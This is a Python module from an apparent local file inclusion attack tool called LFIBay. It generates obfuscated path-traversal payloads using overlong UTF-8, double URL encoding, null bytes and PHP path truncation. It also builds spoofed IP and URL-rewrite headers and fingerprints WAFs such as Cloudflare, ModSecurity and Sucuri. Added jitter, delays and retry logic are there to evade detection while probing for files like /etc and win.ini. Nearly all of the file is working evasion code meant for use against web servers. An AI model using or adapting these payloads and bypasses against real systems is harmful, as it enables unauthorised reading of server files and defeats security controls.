"""
LFIBay - Advanced WAF Bypass Module
Enhanced WAF evasion techniques for 2025
"""

import random
import time
import urllib.parse


def generate_path_obfuscation(payload):
    """
    Generate 13+ path obfuscation variations
    Args:
        payload: Original payload string
    Returns: List of obfuscated payloads
    """
    obfuscations = []
    
    # 1. Slash dot variations
    obfuscations.append(payload)
    if '../' in payload:
        obfuscations.append(payload.replace('../', '....//'))
        obfuscations.append(payload.replace('../', '..../'))
        obfuscations.append(payload.replace('../', '.././'))
    
    # 2. Missing slash
    if '/' in payload:
        obfuscations.append(payload.replace('/', '/./'))
        obfuscations.append(payload.replace('/', '/././'))
    
    # 3. Unicode/UTF-8 overlong encoding
    obfuscations.append(payload.replace('/', '%c0%af'))
    obfuscations.append(payload.replace('/', '%e0%80%af'))
    obfuscations.append(payload.replace('.', '%c0%ae'))
    
    # 4. Double/Triple URL encoding
    encoded_once = urllib.parse.quote(payload)
    obfuscations.append(encoded_once)
    obfuscations.append(urllib.parse.quote(encoded_once))
    
    # 5. Case variations (Windows)
    if 'windows' in payload.lower() or 'win.ini' in payload.lower():
        obfuscations.append(alternate_case(payload))
    
    # 6. Backslash variations
    if '\\' in payload:
        obfuscations.append(payload.replace('\\', '\\\\'))
        obfuscations.append(payload.replace('\\', '\\\\\\\\'))
    
    # 7. Path truncation (for PHP < 5.3.4)
    if '../' in payload:
        truncated = '../' * 100 + payload.split('../')[-1]
        obfuscations.append(truncated)
    
    # 8. Null byte alternatives
    obfuscations.append(f"{payload}%00")
    obfuscations.append(f"{payload}%2500")
    
    # 9. Mixed encoding
    mixed = payload.replace('/', '%2f').replace('.', '.')
    obfuscations.append(mixed)
    
    # 10. Extra slashes
    obfuscations.append(payload.replace('/', '//'))
    obfuscations.append(payload.replace('/', '///'))
    
    # 11. Comment injection
    if 'etc' in payload.lower():
        obfuscations.append(payload.replace('etc', 'e/**/tc'))
    
    # 12. Whitespace injection
    obfuscations.append(payload.replace('/', '/ '))
    
    # 13. Alternative separator
    obfuscations.append(payload.replace('/', '%2f'))
    
    return obfuscations


def generate_bypass_headers():
    """
    Create WAF bypass headers (IP spoofing, custom routing)
    Returns: Dictionary of bypass headers
    """
    headers = {
        # IP Spoofing Headers
        'X-Originating-IP': f'127.0.0.{random.randint(1, 254)}',
        'X-Forwarded-For': f'127.0.0.{random.randint(1, 254)}',
        'X-Remote-IP': f'127.0.0.{random.randint(1, 254)}',
        'X-Remote-Addr': f'127.0.0.{random.randint(1, 254)}',
        'X-Client-IP': f'127.0.0.{random.randint(1, 254)}',
        'X-Host': '127.0.0.1',
        'X-Forwarded-Host': 'localhost',
        
        # Content-Type manipulation
        'Content-Type': 'application/json',
        
        # Custom headers for bypass
        'X-Original-URL': '/',
        'X-Rewrite-URL': '/',
        
        # Accept headers
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        
        # Real browser headers
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    
    # Randomly select subset to avoid detection
    selected_keys = random.sample([k for k in headers.keys() if k.startswith('X-')], random.randint(2, 4))
    selected_keys.extend(['Content-Type', 'Accept', 'Accept-Language', 'Accept-Encoding'])
    
    return {k: headers[k] for k in selected_keys if k in headers}


def mutate_payload(payload):
    """
    Generate multiple encoding mutations
    Args:
        payload: Original payload
    Returns: List of mutated payloads
    """
    mutations = []
    
    # 1. Character substitution
    mutations.append(payload.replace('/', '%2f'))
    mutations.append(payload.replace('../', '..%2f'))
    
    # 2. Case swapping (for case-insensitive systems)
    mutations.append(alternate_case(payload))
    
    # 3. Mixed encoding
    mutations.append(mix_encode(payload))
    
    # 4. Comment injection (PHP specific)
    if 'etc' in payload.lower():
        mutations.append(payload.replace('etc', 'e/**/tc'))
    
    # 5. Whitespace injection
    mutations.append(payload.replace('/', '/ '))
    
    # 6. Double encoding
    mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
    
    # 7. Null byte injection
    mutations.append(f"{payload}%00")
    
    # 8. Path variations
    if '../' in payload:
        mutations.append(payload.replace('../', '....//'))
    
    return mutations


def adaptive_delay(base_delay, waf_detected=False):
    """
    Adaptive delay based on WAF detection with human-like jitter
    Args:
        base_delay: Base delay in seconds
        waf_detected: Boolean indicating if WAF was detected
    Returns: Float - delay time in seconds
    """
    # Increase delay if WAF detected
    if waf_detected:
        base = random.uniform(base_delay * 2, base_delay * 4)
    else:
        base = random.uniform(base_delay, base_delay * 2)
    
    # Add jitter (up to 50%)
    jitter = base * random.uniform(0, 0.5)
    
    # Random spike delays (simulate human behavior)
    if random.random() < 0.1:  # 10% chance of long pause
        jitter += random.uniform(5, 15)
    
    return base + jitter


def detect_waf(response):
    """
    Enhanced WAF detection using response patterns
    Args:
        response: Response dictionary with status_code, headers, content
    Returns: Dictionary with WAF detection results
    """
    detection = {
        'detected': False,
        'type': None,
        'confidence': 'none',
        'indicators': []
    }
    
    status_code = response.get('status_code', 0)
    headers = response.get('headers', {})
    content = response.get('content', '').lower()
    
    # Check headers for WAF signatures
    waf_headers = {
        'cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid'],
        'akamai': ['akamai-', 'x-akamai'],
        'incapsula': ['x-cdn', 'x-iinfo'],
        'modsecurity': ['mod_security', 'modsec'],
        'wordfence': ['wordfence'],
        'sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
        'aws_waf': ['x-amzn-requestid', 'x-amz-cf-id'],
    }
    
    for waf_type, header_indicators in waf_headers.items():
        for indicator in header_indicators:
            for header_key in headers.keys():
                if indicator.lower() in header_key.lower():
                    detection['detected'] = True
                    detection['type'] = waf_type
                    detection['confidence'] = 'high'
                    detection['indicators'].append(f"Header: {header_key}")
    
    # Check content for WAF signatures
    waf_content_signatures = {
        'cloudflare': ['cloudflare', 'cf-ray', 'attention required'],
        'incapsula': ['incapsula', '_incap_sus', 'incapsula incident id'],
        'modsecurity': ['mod_security', 'this error was generated by mod_security'],
        'wordfence': ['wordfence', 'generated by wordfence'],
        'sucuri': ['sucuri', 'access denied - sucuri website firewall'],
        'f5': ['the requested url was rejected'],
        'barracuda': ['barracuda'],
        'fortiweb': ['fortiweb'],
    }
    
    for waf_type, signatures in waf_content_signatures.items():
        for signature in signatures:
            if signature in content:
                detection['detected'] = True
                detection['type'] = waf_type
                detection['confidence'] = 'high'
                detection['indicators'].append(f"Content: {signature}")
    
    # Check for common WAF status codes
    waf_status_codes = [403, 406, 419, 429, 501, 503]
    if status_code in waf_status_codes:
        detection['detected'] = True
        if not detection['type']:
            detection['type'] = 'generic'
        detection['confidence'] = 'medium'
        detection['indicators'].append(f"Status code: {status_code}")
    
    # Check for generic blocking patterns
    block_patterns = [
        'access denied',
        'forbidden',
        'blocked',
        'firewall',
        'security',
        'suspicious',
        'malicious',
        'attack detected',
        'not acceptable',
    ]
    
    for pattern in block_patterns:
        if pattern in content:
            detection['detected'] = True
            if not detection['type']:
                detection['type'] = 'generic'
            if detection['confidence'] == 'none':
                detection['confidence'] = 'low'
            detection['indicators'].append(f"Content pattern: {pattern}")
    
    return detection


def alternate_case(payload):
    """
    Generate alternating case for bypass
    Args:
        payload: Original payload
    Returns: Alternating case payload
    """
    result = ''
    for i, char in enumerate(payload):
        if i % 2 == 0:
            result += char.upper()
        else:
            result += char.lower()
    return result


def mix_encode(payload):
    """
    Mix encoded and non-encoded characters
    Args:
        payload: Original payload
    Returns: Mixed encoded payload
    """
    result = ''
    for i, char in enumerate(payload):
        if i % 2 == 0 and char in ['/', '\\', '.', ':']:
            result += urllib.parse.quote(char)
        else:
            result += char
    return result


def get_evasion_level_config(level='medium'):
    """
    Get configuration for different evasion levels
    Args:
        level: 'low', 'medium', 'high'
    Returns: Dictionary with evasion configuration
    """
    configs = {
        'low': {
            'use_mutations': False,
            'use_bypass_headers': False,
            'delay_multiplier': 1.0,
            'max_retries': 1,
        },
        'medium': {
            'use_mutations': True,
            'use_bypass_headers': True,
            'delay_multiplier': 1.5,
            'max_retries': 2,
        },
        'high': {
            'use_mutations': True,
            'use_bypass_headers': True,
            'delay_multiplier': 2.5,
            'max_retries': 3,
            'use_obfuscation': True,
        },
    }
    
    return configs.get(level, configs['medium'])


def should_retry(response, waf_detection, retry_count, max_retries):
    """
    Determine if request should be retried with different bypass
    Args:
        response: Response dictionary
        waf_detection: WAF detection results
        retry_count: Current retry count
        max_retries: Maximum retries allowed
    Returns: Boolean
    """
    if retry_count >= max_retries:
        return False
    
    # Retry if WAF detected and we have retries left
    if waf_detection['detected']:
        return True
    
    # Retry on specific error codes
    retry_codes = [403, 406, 429, 503]
    if response.get('status_code') in retry_codes:
        return True
    
    return False
